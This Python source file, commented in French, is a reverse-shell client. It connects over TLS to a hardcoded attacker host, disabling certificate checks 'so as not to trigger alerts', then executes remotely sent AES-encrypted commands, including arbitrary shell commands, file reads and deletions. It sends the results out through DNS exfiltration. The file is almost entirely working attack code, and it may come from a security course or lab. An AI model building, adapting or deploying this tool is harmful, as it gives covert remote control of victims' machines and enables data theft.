# client_revershell
# Version 0.8b
# Auteur : Raphaël KATHALUWA-LIYANAGE

# import des librairies
import socket               # communication entre l'attaque et la cible
import ssl                  # chiffrement des échanges
import subprocess           # retourner le résultats des commandes à l'attaquant
import os                   # exécuter des commandes systèmes
import shutil               # copier un fichier
import threading            # manipuler les fichiers
from dns_client import *    # exfiltration via DNS

# /!\ MODIFIER @ HOST AVANT D'EXECUTER LE PROGRAMME
HOST = '192.168.1.6'
# shell disponible sur le port 25566/TCP
PORT = 25566

# port DNS disponible sur le port 53/UDP
DNS_PORT = 53
# clé de 32 octets pour utiliser AES-256 CBC
KEY = b'W3c9vlwl1Cj0tM6FHkh3pZ%OTc+x8ET='
# vecteur initial de 16 octets
IV = b'efd6cb512023b721'
# taille des messages : 128kB
BUFFER_SIZE = 1024 * 128

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# socket enveloppé par la couche TLS 1.3
context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)

# certificat autosigné : désactivation des vérifications
# pour ne pas déclenché d'alerte
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

# enveloppement de la socket avec TLS 1.3
wrapped_socket = context.wrap_socket(sock, server_hostname=HOST)
# connexion vers le serveur (socket)
wrapped_socket.connect((HOST, PORT))

def dns_resolver(host, port):
    # Créer une instance de resolver
    res = resolver.Resolver()

    # Spécifier le serveur DNS
    res.nameservers = [HOST]
    res.port = PORT

    return res

def shell_interpreter(socket):
    try:
        while True:
            # réception de la commande chiffrée et encodée
            received_data = socket.recv(BUFFER_SIZE)

            # déchiffrement + décodage de la commande 
            cmd = decrypt_aes_cbc(KEY, IV, received_data)
            # séparation des arguments de la commande
            cmd = cmd.split()

            # quelle est la commande saisie ?
            # a-t-elle des paramètres ?

            # changer de répertoire
            if cmd[0] == "cd" and os.path.exists(cmd[1]):
                # changer de répertoire système
                os.chdir(cmd[1])
                output = "Changed directory to {}".format(os.getcwd())
                
                # renvoi du nouveau path au serveur
                output = chunk(output)
                send_dns(output)

            # afficher dans quel répertoire on se situe
            elif cmd[0] == "pwd":
                output = os.getcwd()
                output = chunk(output)
                send_dns(output)

            # copie d'un fichier
            elif cmd[0] == "cp":
                
                # le fichier de destination n'existe pas
                if cmd[2] and not os.path.exists(cmd[2]):
                    shutil.copy2(cmd[1], cmd[2])
                    output = f"{cmd[2]} has been created!"
                    output = chunk(output)
                    send_dns(output)
                
                # le fichier de destination existe
                elif os.path.exists(cmd[2]):
                    output = f"{cmd[2]} already exists!"
                    output = chunk(output)
                    send_dns(output)
                
                # mauvaise utilisaiton de la commande cp
                else:
                    output = b"usage: cp <source> <destination>"
                    output = chunk(output)
                    send_dns(output)

            # lister les fichiers/dossier présent dans le répertoire courant
            elif cmd[0] == "ls":
                
                # pour les machines Windows NT => commande "dir"
                if os.name == 'nt':
                    output = subprocess.check_output(["dir"], shell=True, text=True)
                    output = chunk(output)
                    send_dns(output)
                
                # pour GNU/Linux => "ls -al"
                else:
                    output = subprocess.check_output(["ls -al"], shell=True, text=True)
                    output = chunk(output)
                    send_dns(output)

            # supprimer un fichier
            elif cmd[0] == "rm":
                
                # vérification que le fichier en argument existe
                if os.path.exists(cmd[1]):
                    os.remove(cmd[1])
                    output = f"{cmd[1]} removed!"
                    output = chunk(output)
                    send_dns(output)
                
                # si le fichier en argument n'existe pas
                else:
                    output = f"{cmd[1]} does not exist"
                    output = chunk(output)
                    send_dns(output)

            # quel utilisateur on contrôle
            elif cmd[0] == "who" and os.name == 'nt':
                output = os.getlogin()
                output = chunk(output)
                send_dns(output)

            # afficher le contenu d'un fichier
            elif cmd[0] == "cat":
                # ouverture du fichier en lecture seule
                output = open(cmd[1], 'r')
                output = output.read()

                # réception et envoi de son contenu
                output = chunk(output)
                send_dns(output)

            # le reste (inclut git :D)
            else:
                # exécution de la commande
                command = subprocess.Popen(cmd, shell=True,
                                        stdout=subprocess.PIPE, 
                                        stderr=subprocess.PIPE)
                # on récupère stdout et stderr
                output, err = command.communicate()
                
                # envoi de stdout
                if output:
                    output = chunk(output.decode())
                    send_dns(output) 
                # envoi de stderr
                elif err:
                    err = chunk(err.decode())
                    send_dns(err)
                # autre pour garantir la stabilité du programme
                else:
                    message = chunk(b"[-] Error: couldn't send data")
                    send_dns(message)

    except Exception as e:
        # affichage de l'exception + arrêt du programme au status -1
        print(e)
        exit(-1)
    finally:
        # fermeture de la socket
        socket.close()
        exit(0)

if __name__ == "__main__":
    # effacer l'affichage de la console
    # OS Windows
    if os.name == 'nt':
        windows = os.system('cls')

    # OS UNIX
    else:
        unix = os.system('clear')
    
    # création d'un thread pour lancer le shell
    thread_dns = threading.Thread(target=shell_interpreter, args=[wrapped_socket])
    thread_dns.start()
    
    # lancement sur résolveur DNS
    dns_resolver(HOST, DNS_PORT)